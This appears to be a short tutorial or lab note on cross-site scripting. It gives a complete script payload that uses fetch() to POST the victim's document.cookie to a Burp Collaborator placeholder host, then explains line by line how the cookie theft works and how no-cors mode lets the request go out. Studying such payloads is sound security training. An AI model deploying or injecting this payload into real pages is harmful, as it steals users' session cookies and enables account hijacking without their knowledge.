<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<script> tag: This is an HTML tag that allows JavaScript code to be embedded in a webpage. In this case, the JavaScript code runs when the page is loaded by the victim.

fetch() function:

The fetch() function is used to send an HTTP request (in this case, a POST request) to a specified URL.
It is a modern JavaScript method used to make network requests asynchronously, which is particularly useful in XSS attacks to send data without requiring page reloads.
'https://BURP-COLLABORATOR-SUBDOMAIN': This is the URL where the victim’s cookie will be sent. In this case, it's a placeholder for the actual Burp Suite Collaborator subdomain where the attacker can collect exfiltrated data (like the victim's cookies). The attacker replaces 'BURP-COLLABORATOR-SUBDOMAIN' with their actual Burp Collaborator subdomain.

method: 'POST':

This sets the HTTP request method to POST, which means the data (in this case, the victim's cookie) will be sent in the body of the request.
The POST method is typically used for sending sensitive data (like cookies) because the data is included in the body of the request, not the URL.
mode: 'no-cors':

This mode tells the browser to send the request even if there are Cross-Origin Resource Sharing (CORS) restrictions. With no-cors, the browser will allow the request to be sent, but the response won't be accessible (hence the victim’s browser will not see the response). The attacker can still capture the request on their server (Burp Collaborator) even if the browser blocks the response.
body: document.cookie:

The body of the request contains document.cookie, which is a JavaScript property that holds the cookies for the current webpage.
When this script is executed, it retrieves the cookies from the victim's browser and sends them to the Burp Collaborator server via the POST request.
